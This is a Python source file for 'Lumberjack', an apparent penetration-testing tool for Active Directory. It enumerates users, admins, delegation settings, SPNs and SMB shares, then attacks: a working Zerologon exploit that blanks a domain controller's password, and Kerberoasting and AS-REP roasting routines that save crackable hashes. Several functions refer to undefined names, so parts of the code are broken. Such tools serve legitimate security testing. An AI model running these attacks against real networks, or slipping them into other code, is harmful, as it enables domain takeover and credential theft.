#!/usr/bin/python3
# -*- coding: utf-8 -*-
try:
	# Module imports
	import argparse, ldap3, json, re, random, sys, socket, textwrap

	# Other imports
	from binascii import hexlify, unhexlify
	from datetime import datetime, timedelta
	from getpass import getpass
	from ldap3 import SUBTREE, ALL_ATTRIBUTES 
	from ldap3.core.exceptions import LDAPBindError, LDAPException	
	from netaddr import *
	from pprint import pprint
	from pyasn1.codec.der import decoder, encoder
	from pyasn1.type.univ import noValue
	from pyfiglet import Figlet
	from rich.console import Console, Theme
	from time import sleep
	from termcolor import colored, cprint

	# Credit to SecureAuthCorp for GetNPUsers.py and GetUserSPNs
	from impacket.krb5.kerberosv5 import KerberosError
	from impacket.krb5.types import Principal
	from impacket.dcerpc.v5 import nrpc, epm
	from impacket.smbconnection import SessionError
	from impacket.krb5.kerberosv5 import getKerberosTGS
	from impacket.ntlm import compute_lmhash, compute_nthash
	from impacket.krb5 import constants
	from impacket.krb5.kerberosv5 import getKerberosTGT
	from impacket.krb5.asn1 import TGS_REP
	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
	from impacket.dcerpc.v5 import transport
	from impacket import smbconnection
	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
	from impacket.krb5.types import KerberosTime, Principal
	
except Exception as e:
    	print ("Error {}".format(e))

"""
lumberjack.py
"""

custom_theme = Theme({"success": "cyan", "error": "red", "warning": "yellow", "status": "green", "info": "purple"})
console = Console(theme=custom_theme)
LDAP_BASE_DN = 'DC=hacklabtest,DC=local'

# Give up brute-forcing after 2000 attempts.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

#impacket utils.py
def parse_credentials(credentials):

	# Regular expression to parse credentials information
	credential_regex = re.compile(r"(?:(?:([^/:]*)/)?([^:]*)(?::(.*))?)?")
	""" Helper function to parse credentials information. The expected format is:
	<DOMAIN></USERNAME><:PASSWORD>
	:param credentials: credentials to parse
	:type credentials: string
	:return: tuple of domain, username and password
	:rtype: (string, string, string)
	"""
	domain, username, password = credential_regex.match(credentials).groups('')

	return domain, username, password

#Connection Class
class Connect (object):
	
	def __init__(self, credentials, dc_ip, status):
	
		self.status = status
		self.status.update(status="[bold white]Connecting to Active Directory...")
		sleep(1)
		self.credentials = credentials
		# Regular expression to parse credentials information
		credential_regex = re.compile(r"(?:(?:([^/:]*)/)?([^:]*)(?::(.*))?)?")
		self.domain, self.username, self.password = credential_regex.match(self.credentials).groups('')
		self.dc_ip = dc_ip
		self.server, self.conn = Connect.connect(self, self.dc_ip, self.domain, self.username, self.password)
		
	#Connect to domain
	def connect(self, dc_ip, domain, username, password):
	
		if dc_ip is not None:
			self.target = self.dc_ip
		else:
			self.target = self.domain
	
		self.user = '%s\\%s' % (self.domain, self.username)
		
		try:
			self.server = ldap3.Server(self.target, get_info=ldap3.ALL, port=636, use_ssl=True)
			self.conn = ldap3.Connection(self.server, user=self.user, password=self.password, authentication=ldap3.NTLM, auto_bind=True)
			self.conn.bind()
			self.conn.start_tls()
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
		return self.server, self.conn
	
	
#Enumeration Class
class EnumerateAD(object):

	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, asrep, root=None):
		
		self.asrep = asrep
		self.large = large
		self.status = status
		self.domain = domain
		self.username = username
		self.password = password
		self.dc_ip = dc_ip
		self.fuzz = fuzz
		self.smb = smb
		self.kerberoast = kerberoast
		self.server = server
		self.conn = conn
		self.computers = []
		self.spn = []   
		self.users = []

		if root is None:
            		self.root = self.getRoot()
		else:
			self.root = root
	
	def getRoot(self):
        	return self.server.info.other['defaultNamingContext'][0]
        	
	#Enumerate Active Directory Users		
	def enumerateUsers(self):
	
		try:		
			userObj = []	
			self.status.update("[bold white]Finding Active Directory Users...")
			sleep(1)
			console.rule("[bold red]Domain Users")
			#Search AD Users (Verbose)
			if self.large:
				self.total_entries = 0
				self.entry_generator = self.conn.extend.standard.paged_search('%s' % (self.root),
							search_filter='(objectCategory=person)',
							attributes=['sAMAccountName'], 
							size_limit=0)
				for entry in self.entry_generator:
					pprint(entry)
				console.print ("[+] Success: Got all domain users ", style = "success")
				print('')
			else:
				self.conn.search('%s' % (self.root), search_filter='(objectCategory=person)',
						 attributes=['sAMAccountName'], 
						 size_limit=0)
				for entry in self.conn.entries:
					name = entry["sAMAccountName"][0]
					userObj.append({
						print(f'[+] {name} \n'),
					})

				console.print("[+] Success: Got all domain users ", style = "success")
				print('')
				console.print("[-] Found {0} domain users".format(len(self.conn.entries)), style = "info")
				print('')
		except LDAPException as e:
			console.print ("[-] Warning: No Users found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Computers?", style = "status")
			input("")
			EnumerateAD.enumComputers(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Active Directory Computers		
	def enumComputers(self):

		try:		
			computerObjects = []		
			self.status.update("[bold white]Finding Active Directory Computers...")
			sleep(1)
			console.rule("[bold red]Domain Computers")
			#Search AD Computers
			self.conn.search('%s' % (self.root), search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', attributes=['name','dnshostname'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["dnshostname"][0]
				computerObjects.append({
					print(f'[+] {name} \n'),
				})
				self.computers.append(entry)
			print('')
			console.print ("[+] Success: Got all domain computers ", style = "success")
			print('')
			console.print('[-] Found {0} computers'.format(len(self.conn.entries)), style = "info")
			print('')
			if self.smb:
				self.smbShareCandidates = []
				self.smbBrowseable = {}
				self.sortComputers()
				self.enumSMB()
			else:
				try:
					self.status.update("[bold white]Waiting...")
					console.print ("[-] Find Groups?", style = "status")
					input("")
					EnumerateAD.enumerateGroups(self)
				except KeyboardInterrupt:
					self.conn.unbind()
					console.print ("[-] Warning: Aborted", style = "warning")
					sys.exit(1)	
		except LDAPException as e:
			console.print ("[-] Warning: No Computers found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		
	#Enumerate Active Directory Groups			
	def enumerateGroups(self):
		
		try:
			groupobj = []
			self.status.update("[bold white]Finding Active Directory Groups...")
			sleep(1)
			console.rule("[bold red]Domain Groups")
			#Search AD Group
			self.conn.search('%s' % (self.root), search_filter='(objectCategory=group)', attributes=['distinguishedName', 'cn'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["distinguishedName"][0]
				groupobj.append({
					print(f'[+] {name} \n'),
				})
			console.print ("[+] Success: Got all groups ", style = "success")
			print('')
			console.print('[-] Found {0} groups'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No Groups found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Organisational Units?", style = "status")
			input("")
			EnumerateAD.enumerateOUs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Organisational Units
	def enumerateOUs(self):
		
		try:
			ouObj = []
			self.status.update("[bold white]Finding Organisational Units...")
			sleep(1)
			console.rule("[bold red]Organisational Units")
			#Search AD Organisational Units
			self.conn.search('%s' % (self.root), search_filter='(objectclass=organizationalUnit)', attributes=['distinguishedName'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["distinguishedName"][0]
				ouObj.append({
					print(f'[+] {name} \n'),
				})
			console.print ("[+] Success: Got all OUs ", style = "success")
			print('')
			console.print('[-] Found {0} OUs'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No OUs found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Admins?", style = "status")
			input("")
			EnumerateAD.search_admins(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
			
	#Search for domain admins
	def search_admins(self):
	
		try:
			admin_users = []
			self.status.update("[bold white]Finding Admin Users...")
			sleep(1)
			console.rule("[bold red]Admin Users")
			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))', attributes=['sAMAccountName'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["sAMAccountName"][0]
	
				admin_users.append({
					print(f'[+] {name} \n'),
				})
			console.print ("[+] Success: Got all Admins ", style = "success")
			if len(admin_users) >= 1:
				print ('')
				console.print ("[!] Vulnerability: Domain has too many admin accounts ", style = "error")
			print('')
			console.print('[-] Found {0} Admins'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No Admins found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Domain Policies", style = "status")
			input("")
			EnumerateAD.getDomainPolicy(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
			
	#Get domain policies		
	def getDomainPolicy(self):

		try:
			domainpolicies = []
			self.status.update("[bold white]Finding domain policies...")
			sleep(1)
			console.rule("[bold red]Domain Policies")
			self.conn.search('%s' % (self.root), '(objectClass=domain)', attributes=ALL_ATTRIBUTES, size_limit=0)
			MachineAccountQuota = None
			for entry in self.conn.entries:
				name = entry["ms-DS-MachineAccountQuota"][0]
				MachineAccountQuota = int(str(entry['ms-DS-MachineAccountQuota']))
				
				domainpolicies.append({
					print(f'[+] {name} \n'),
				})
			
			if MachineAccountQuota < 0:
        			console.print("[-] Not vulnerable, cannot proceed with Machine creation")
			else:
				console.print ("[!] Vulnerability: Possible Attack Vector, can be exploited further.", style = "error")
			print('')
			console.print('[-] Found {0} Domain policies'.format(len(self.conn.entries)), style = "info")
			print('')

		except LDAPException as e:
			console.print ("[-] Warning: No Admins found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Users with Unconstrained Delegation?", style = "status")
			input("")
			EnumerateAD.unconstrainedDelegation(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
			
	#Enumerate accounts trusted for delegation (unconstrained delegation)					
	def unconstrainedDelegation(self):
	
		try:	
			unconstrained = []
			self.status.update("[bold white]Finding Users with Unconstrained Delegation...")
			sleep(1)
			console.rule("[bold red]Unconstrained Delegation")
			self.conn.search('%s' % (self.root), search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
			for entry in self.conn.entries:
				name = entry["sAMAccountName"][0]
				unconstrained.append({
					print(f'[+] {name} \n'),
				})
			if len(self.conn.entries) >= 1:
				print('')
				console.print ("[!] Vulnerability: Domain Vulnerable to unconstrained delegation", style = "error")
				print('')
			console.print('[-] Found {0} account(s) with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Enumerate SPNs?", style = "status")
			input("")
			EnumerateAD.enumSPNs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)	
						
	#Enumerate SPNs
	def enumSPNs(self):
	
		try:	
			spnslist = []
			self.status.update("[bold white]Enumerating SPNs...")
			sleep(1)
			console.rule("[bold red]SPN Accounts")
			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
			self.conn.search('%s' % (self.root), search_filter=self.filter, attributes=['name', 'userPrincipalName', 'servicePrincipalName'], size_limit=0)

			for entry in self.conn.entries:
				name = entry["userPrincipalName"][0]
				self.spn.append(entry)
				spnslist.append({
					print(f'[+] {name} \n'),
				})
			console.print ("[+] Success: Got all SPNs ", style = "success")
			print('')
			console.print('[-] Found {0} SPN Account(s)'.format(len(self.conn.entries)), style = "info")
			print('')
			if self.kerberoast:
				ExploitAD.kerberoast(self.dc_ip, self.spn, self.username, self.password, self.domain, self.status)
			else:	
				pass
			
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Enumerate AS-REP Roastable Users?", style = "status")
			input("")
			EnumerateAD.enumKerbPreAuth(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")

	#Enumerate Users that dont require Keberos Pre-Authentication 
	def enumKerbPreAuth(self):
		
		asRepObj = []
		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...")
		sleep(1)
		# Build user array
		console.rule("[bold red]AS-REP Roastable Users")
		self.conn.search('%s' % (self.root), search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
				attributes=["cn", "objectSid", "sAMAccountName"], search_scope=SUBTREE)
		for entry in self.conn.entries:
			name = entry["sAMAccountName"][0]
			asRepObj.append({
				print(f'[+] {name} \n'),
			})
			self.users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.domain))
		if len(self.conn.entries) >= 1:
			console.print ("[!] Vulnerability: Domain users vulnerable to AS-REP Roasting", style = "error")
			print('')
		console.print('[-] Found {0} account(s) that dont require pre-authentication'.format(len(self.conn.entries)), style = "info")
		if self.asrep:
				ExploitAD.ASREPRoast(self.users, self.domain, self.dc_ip, self.status)
		else:	
			sys.exit(1)
		
	#Fuzz AD with ANR (Ambiguous Name Resolution)
	def searchRandom(self, fobject, objectCategory=''):
	
		self.status.update("[bold white]Fuzzing Active Directory for: '{}'".format(fobject))
		console.rule("[bold red]Random AD Objects")
		sleep(1)
		if objectCategory:
			searchFilter = '(&(objectCategory={})(anr={}))'.format(objectCategory, fobject)
		else:
			searchFilter = '(anr={})'.format(fobject)
		try:	
			self.conn.search('%s' % (self.root), search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} objects'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries) 
		except LDAPException as e:   
			console.print ("[-] Warning Nothing found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
			
	def get_user_info(self, samname):

		self.conn.search(self.dc_search[:-1], '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid','ms-DS-MachineAccountQuota'])
		try:
			et = self.conn.entries[0]
			js = et.entry_to_json()
			return json.loads(js)
		except IndexError:
			return False
	
	def sortComputers(self):

		for computer in self.computers:
		    try:
		        self.smbShareCandidates.append(computer['dNSHostName'])
		    except LDAPKeyError:
		        # No dnsname registered
		        continue
		if len(self.smbShareCandidates) == 1:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")
		else:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")

	def enumSMB(self):

		self.status.update("[bold white]Enumerating SMB: '{}'".format(fobject))		
		try:
			console.rule("[bold red]Enumerating SMB")
			for dnsname in self.smbShareCandidates:
				try:
					# Changing default timeout as shares should respond withing 5 seconds if there is a share
					# and ACLs make it available to self.user with self.passwd
					smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
					smbconn.login(self.dUser, self.dPassword)
					dirs = smbconn.listShares()
					self.smbBrowseable[str(dnsname)] = {}
					for share in dirs:
						self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
						try:
							_ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
							self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
						except (SessionError, UnicodeEncodeError, NetBIOSError):
							continue
					smbconn.logoff()
				except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
					continue
		except ValueError:
				pass
		print('')
		availDirs = []
		for key, value in self.smbBrowseable.items():
			for _, v in value.items():
				if v:
					availDirs.append(key)

		if len(self.smbShareCandidates) == 1:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), 
						len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		else:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), 
						len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		if len(self.smbBrowseable.keys()) > 0:
			with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
				json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
			print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.dc))

#Exploitation Class
class ExploitAD(object):

	#split json array
	def splitJsonArr(arr):
		if isinstance(arr, list):
		    if len(arr) == 1:
		        return arr[0]
		return arr


	"""
	Check if domain controller is vulnerable to the Zerologon attack aka CVE-2020-1472.
	Resets the DC account password to an empty string when vulnerable.
	"""
	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
	
		# Connect to the DC's Netlogon service.
		binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
		rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
		rpc_con.connect()
		rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

		# Use an all-zero challenge and credential.
		plaintext = b"\x00" * 8
		ciphertext = b"\x00" * 8

		# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
		flags = 0x212fffff

		# Send challenge and authentication request.
		nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
		try:
			server_auth = nrpc.hNetrServerAuthenticate3(
				rpc_con, dc_handle + "\x00", target_computer + "$\x00",
				nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
						target_computer + "\x00", ciphertext, flags
			)
			assert server_auth["ErrorCode"] == 0
			return rpc_con

		except nrpc.DCERPCSessionError as ex:
			# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
			if ex.get_error_code() == 0xc0000022:
				return None
			else:
				 console.print ("[-] Unexpected error code returned from DC: {}".format(ex.get_error_code), style = "error")
		except BaseException as ex:
			console.print ("[-] Error {}".format(ex), style = "error")

	def try_zerologon(dc_handle, rpc_con, target_computer):
		
		request = nrpc.NetrServerPasswordSet2()
		request["PrimaryName"] = dc_handle + "\x00"
		request["AccountName"] = target_computer + "$\x00"
		request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
		authenticator = nrpc.NETLOGON_AUTHENTICATOR()
		authenticator["Credential"] = b"\x00" * 8
		authenticator["Timestamp"] = 0
		request["Authenticator"] = authenticator
		request["ComputerName"] = target_computer + "\x00"
		request["ClearNewPassword"] = b"\x00" * 516
		return rpc_con.request(request)

	#main function for Zerologon
	def perform_attack(dc_handle, dc_ip, target_computer):
	
		console.rule("[bold red]Zerologon Vulnerability")

		# Keep authenticating until successful. Expected average number of attempts needed: 256.
		rpc_con = None
		for attempt in range(0, MAX_ATTEMPTS):
			rpc_con = ExploitAD.try_zero_authenticate(dc_handle, dc_ip, target_computer)
			if rpc_con is None:
				status.update("[bold white]Performing authentication attempts...")
			else:
				break

		if rpc_con:
			sleep(1)
			console.print("[+] Success: Target is vulnerable!", style = "success")
			print('')
			status.update("[bold white]Waiting...")
			console.print("[-] Do you want to continue and exploit the Zerologon vulnerability? N/y", style = "warning")
			exec_exploit = input().lower()
			if exec_exploit == "y":
				status.update("[bold white]Exploiting Zerologon vulnerability...")
				print('')
				result = ExploitAD.try_zerologon(dc_handle, rpc_con, target_computer)
				if result["ErrorCode"] == 0:
	
					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string.", style = "success")
				else:
					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}".format(result["ErrorCode"]), style = "warning")
			else:
				console.print("[-] Aborted", style = "warning")
				sys.exit(0)
		else:
			console.print("[-] Warning: Exploit failed, CVE-2020-1472 is probably patched on target domain", style = "warning")
			sys.exit(1)

	#Test for CVE-2021-42287(NoPac)
	def TGT_size(credentials, dc_ip, status):
		
		status.update(status="[bold white]Testing for No_Pac vulnerability...")
		console.rule("[bold red]CVE-2021-42287")

		domain, username, password = parse_credentials(credentials)
		userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
		print(f"Domain : {domain} \nUsername : {username} \nPassword: {password} \nIP Address : {dc_ip}")
		lmhash = ''
		nthash = ''
		__aesKey = None
		tgt = getKerberosTGT(userName, password, domain, unhexlify(lmhash), unhexlify(nthash), __aesKey, dc_ip, requestPAC=True)
		tgt_2 = getKerberosTGT(userName, password, domain, unhexlify(lmhash), unhexlify(nthash), __aesKey, dc_ip, requestPAC=False)

		TGT_size, TGT_size_2 = len(tgt),len(tgt_2)

		print("<"*2+"-"*22+" TGT Size"+"-"*22+'>'*2)
		print(f"[+] Length of TGT size with PAC: {TGT_size} \n")

		print(f"[+] Length of TGT size without PAC: {TGT_size_2} \n")

		if TGT_size == TGT_size_2:
			print( "[-] Not Vulnerable, PAC validated\n")
		else:
			print("[!] Possibly vulnerable to CVE-2021-42287. \n\n[+] Apply Patches")
			print("<"*3+"-"*51+'>'*3)	
				
	#Kerberoasting: From GetUserSPNs.py			
	def kerberoast(dc_ip, spn, username, password, domain, status):
		
		status.update(status="[bold white]Kerberoasting SPN Accounts...")
		sleep(1)
		console.rule("[bold red]Kerberoasting")

		users_spn = {}
		user_tickets = {}

		idx = 0
		for entry in spn:
			spnJson = json.loads(spn[idx].entry_to_json())
			users_spn[ExploitAD.splitJsonArr(spnJson['attributes'].get('name'))] = ExploitAD.splitJsonArr(spnJson['attributes'].get('servicePrincipalName')) 
			idx += 1    

		# Get TGT for the supplied user
		client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
		try:
			# We need to take the domain from the user@domain since it *could* be a cross-domain user
			tgt, cipher, _, newSession = getKerberosTGT(client, password, domain, compute_lmhash(password), compute_nthash(password), None, dc_ip)

			TGT = {}
			TGT['KDC_REP'] = tgt
			TGT['cipher'] = cipher
			TGT['sessionKey'] = newSession

			for user, spns in users_spn.items():
				if isinstance(spns, list):
					# We only really need one to get a ticket
					spn1 = spns[0] # lgtm [py/multiple-definition]
				else:
					spn1 = spns
					try:
						# Get the TGS
						serverName = Principal(spn1, type=constants.PrincipalNameType.NT_SRV_INST.value)
						tgs, cipher, _, newSession = getKerberosTGS(serverName, domain, dc_ip, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
						# Decode the TGS
						decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
						# Get different encryption types
						if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'],
							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
							user_tickets[spn1] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
							entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'],
							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
							user_tickets[spn1] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
							entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'],
							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
							user_tickets[spn1] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], 
							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), 
							hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
							user_tickets[spn1] = entry

					except KerberosError:
						continue

			if len(user_tickets.keys()) > 0:
				with open('{0}-spn-tickets'.format(domain), 'w') as f:
					for key, value in user_tickets.items():
						f.write('{0}:{1}\n'.format(key, value))
				if len(user_tickets.keys()) >= 1:
					console.print('Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()),
					domain))	
			else:
				console.print('Received {0} ticket(s) for Kerberoasting'.format(len(user_tickets.keys())))
			
			sys.exit(0)

		except KerberosError as err:
			console.print('Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
			sys.exit(1)

	#ASREPRoast: From GetNPUsers.py
	def ASREPRoast(users, domain, dc_ip, status):

		status.update(status="[bold white]ASREP Roasting...")
		sleep(1)
		console.rule("[bold red]ASREP Roasting")

		# Build user array
		hashes = []
		# Build request for Tickets
		for usr in users:
			clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			asReq = AS_REQ()
			Domain = str(domain).upper()
			serverName = Principal('krbtgt/{0}'.format(Domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			pacReq = KERB_PA_PAC_REQUEST()
			pacReq['include-pac'] = True
			encodedPacReq = encoder.encode(pacReq)
			asReq['pvno'] = 5
			asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
			asReq['padata'] = noValue
			asReq['padata'][0] = noValue
			asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
			asReq['padata'][0]['padata-value'] = encodedPacReq

			requestBody = seq_set(asReq, 'req-body')

			options = list()
			options.append(constants.KDCOptions.forwardable.value)
			options.append(constants.KDCOptions.renewable.value)
			options.append(constants.KDCOptions.proxiable.value)
			requestBody['kdc-options'] = constants.encodeFlags(options)

			seq_set(requestBody, 'sname', serverName.components_to_asn1)
			seq_set(requestBody, 'cname', clientName.components_to_asn1)

			requestBody['realm'] = Domain

			now = datetime.utcnow() + timedelta(days=1)
			requestBody['till'] = KerberosTime.to_asn1(now)
			requestBody['rtime'] = KerberosTime.to_asn1(now)
			requestBody['nonce'] = random.getrandbits(31)

			supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

			seq_set_iter(requestBody, 'etype', supportedCiphers)

			msg = encoder.encode(asReq)

			try:
				response = sendReceive(msg, Domain, dc_ip)
			except KerberosError as e:
				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
					seq_set_iter(requestBody, 'etype', supportedCiphers)
					msg = encoder.encode(asReq)
					response = sendReceive(msg, Domain, dc_ip)
				else:
					print(e)
					continue

			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), 
							hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

		if len(hashes) > 0:
			with open('{0}-jtr-hashes'.format(domain), 'w') as f:
				for h in hashes:
					f.write(str(h) + '\n')

			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(domain))
		else:
			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')

		
#function for lumberjack title art
def titleArt():
	f = Figlet(font="slant")
	cprint(colored(f.renderText('Lumberjack'), 'cyan'))

def main():

	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
			 __                    __              _            __
			/ /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
		       / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
		      / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
		     /_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
							/___/
	                       __.                                   By Tom Gardner
	              ________/o |)
	             {_______{_rs|
	        
       A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
    |*------------------------------------------------------------------------------------------*|
   	 '''))

	#Required arguments
	parser.add_argument('credentials', action='store', help='domain/username[:password]. Valid domain credentials to use for grabbing targetUser\'s PAC \n ')
	parser.add_argument('-u', '--username', type=str, help='Username of domain user. The username format must be `user@domain.org`')
	parser.add_argument('-p', '--password', type=str, help='User Password`')
	parser.add_argument('-h', '--help', help='show this help message and exit', action='help')
	parser.add_argument('-ip', '--ip_address', type=str, help='ip address of Active Directory')
